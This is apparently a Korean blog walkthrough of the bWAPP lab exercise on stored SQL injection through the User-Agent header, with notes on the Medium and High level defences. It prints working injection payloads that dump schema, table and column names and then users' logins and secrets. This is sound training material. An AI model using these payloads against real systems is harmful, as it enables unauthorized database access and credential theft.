---
layout: single
title: (bWAPP)SQL Injection - Stored (User-Agent)
categories: bwapp
tag: [sql injection, sql, injection, bwapp, bee box, GET, OWASP TOP 10, OWASP]
toc: true
author_profile: false
---

# 검증 로직
> Low Level 에서는 보안 대책이 적용되어 있지 않다.

## Level - Low

![그림 1-1](/assets/image/bwapp/injection/stored-useragent-archive/image.png)
- HTTP 요청 헤더의 User-Agent 값이 페이지상에 노출되고 있다.
- 출력되는 문구를 보면 IP 주소와 User-Agent 문자열을 가지고 데이터베이스에 로그인된다.
- 즉 두 값을 가지고 DB에 요청을 하는 거 같다.
- 즉 User-Agent 값을 조작하여 조작된 값과 미완성된 서버측의 SQL 구문이 합쳐져
- DB에 악의적인 질의가 가능하다..

```
GET /bWAPP/sqli_17.php HTTP/1.1
Host: <ip>
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://<ip>/bWAPP/portal.php
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: BEEFHOOK=UhoQoFNoEivNNG7EheQSAIsf8yrWl2cCOaY1uXgrLizZDIE3F6QYDxbWZ3vLOnqtvLxBoUX7D3L6LmPP; security_level=0; PHPSESSID=213a612355e7ca062dfdb9868aca27e2
Connection: close
```

- Burp Suite를 통해 요청 패킷을 잡아보면 위와 같이 존재한다.

![그림 1-2](/assets/image/bwapp/injection/stored-useragent-archive/image2.png)
- User-Agent 에 ‘(싱글쿼터)를 넣게되면 그림 1-2와 같이 DBMS Error를 반환한다.

> ``` $sql = "INSERT INTO visitors (date, user_agent, ip_address) VALUES (now(), '" . sqli($user_agent) . "', '" . $ip_address . "')";```

- 미완성된 SQL구문은 위 코드와 같이 이루어져 있다.
- (now(),useragent,ip) 와 같이 이루어져 있다.

```sql
User-Agent: a','192.168.146.1')#
```

![그림 1-3](/assets/image/bwapp/injection/stored-useragent-archive/image3.png)
- 위 코드와 같이 User-Agent 값을 변조해서 보내게 되면 a가 출력된다.
- 하지만 해당 부분인 문자열로 감싸져 있어서 이를 탈출하기가 불가능 하여
- 뒷 부분에 이어지는 IP_ADDRESS 부분을 변조시킬 수 있다.

```sql
User-Agent: a',(select schema_name from information_schema.schemata limit 1,1))#
```

![그림 1-4](/assets/image/bwapp/injection/stored-useragent-archive/image4.png)
- 위와 같이 IP Address 부분에 bWAPP 데이터베이스가 노출되었다.
- 이와 같이 테이블명 및 컬럼명 추출이 가능하다.

```sql
User-Agent: a',(select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1))#
```

```sql
User-Agent: a',(select column_name from information_schema.columns where table_schema='bWAPP' and table_name='users' limit 1,1))#
```

```sql
User-Agent: a',(select concat(login,0x3a,secret) from bWAPP.users limit 1,1))#
```

![그림 1-5](/assets/image/bwapp/injection/stored-useragent-archive/image5.png)
- 성공적으로 데이터를 추출할 수 있다.


## Medium & High

```php
function sqli_check_1($data)
{
    return addslashes($data)
}

function sqli_check_2($data)
{
    return mysql_real_escape_string($data);
}
```

1. Medium Level 에서는 addslahes() 함수를 사용하여 ‘(싱글쿼터 )를 입력하게되면 \ 를 앞에 붙여 ‘(싱글쿼터) 사용을 막고 있다. 해당 search 구문인 ‘%%’ 로 이루어져 있어 공격이 성립되지 않는다.
2. High Level 에서는 mysql_real_escape_string() 함수를 사용하여 메타문자를 방지하고 있다.
3. 해당 문제에서 Medium 과 High Level은 공격이 성립되지 않는다.


